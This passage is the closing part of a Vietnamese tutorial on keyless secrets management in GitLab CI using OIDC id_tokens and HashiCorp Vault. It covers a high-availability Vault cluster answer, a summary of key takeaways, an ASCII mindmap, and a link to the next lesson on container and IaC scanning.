    <span>Làm cách nào để triển khai cụm HashiCorp Vault High Availability (HA) phục vụ hàng ngàn Runners đồng thời?</span>
  </summary>
  <div class="qa-body">
    <div class="qa-answer">
      <div class="qa-answer-header">
        <svg class="qa-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
        <span>Phân Tích &amp; Lời Giải Kỹ Thuật</span>
      </div>
      <p><strong>Kiến trúc HA:</strong></p>
      <p>Triển khai cụm Vault gồm tối thiểu 3 đến 5 nodes sử dụng <strong>Raft Integrated Storage</strong> hoặc <strong>Consul Storage Backend</strong>. Sử dụng một Bộ cân bằng tải (Load Balancer - NLB/HAProxy) đặt phía trước để định tuyến lưu lượng vào Active Node và phân tải các truy vấn đọc (Read Replicas / Performance Standby Nodes).</p>
    </div>
  </div>
</details>

---

## 7. Tổng Kết & Lộ Trình Bài Học Tiếp Theo

### 7.1. Tóm Tắt Các Điểm Cốt Lõi (Architectural Key Takeaways)
- **Keyless Zero-Trust**: Loại bỏ hoàn toàn khóa tĩnh dài hạn khỏi GitLab CI Variables.
- **OIDC JWT Federation**: Sử dụng `id_tokens` có chữ ký mật mã để xác thực danh tính Runner với HashiCorp Vault.
- **Context-Bound Claims**: Ràng buộc chặt chẽ quyền truy cập theo `project_id`, `ref` và `ref_protected`.
- **Dynamic Ephemeral Secrets**: Cấp phát thông tin đăng nhập tạm thời tự hủy theo thời gian sống (TTL).

### 7.2. Sơ Đồ Tư Duy Hệ Thống Quản Lý Bí Mật OIDC & Vault (Mindmap)

```text
                     QUẢN TRỊ BÍ MẬT KHÔNG KHÓA (OIDC & VAULT)
                                        │
        ┌───────────────────────────────┼───────────────────────────────┐
        ▼                               ▼                               ▼
  [ GitLab OIDC Identity ]     [ Vault JWT Auth Engine ]       [ Dynamic Secrets Engine ]
  - id_tokens JWT Claims       - Bound Claims Validation       - KV v2 Secret Store
  - Cryptographic JWKS         - Context Policies (RBAC)       - Dynamic DB Credentials
  - Protected Ref Enforcement  - Short-Lived Tokens (TTL)      - AWS STS IAM Federation
```

> [!TIP]
> **Bước tiếp theo trong lộ trình**: Khám phá quy trình quét lỗ hổng hình ảnh Container và kiểm tra an ninh hạ tầng Infrastructure-as-Code trong [Bài 31: Quét Lỗ Hổng Container & IaC: Trivy, Checkov, Kics & DefectDojo](gitlab-31-31-container-va-iac-scan.html).
{% endraw %}
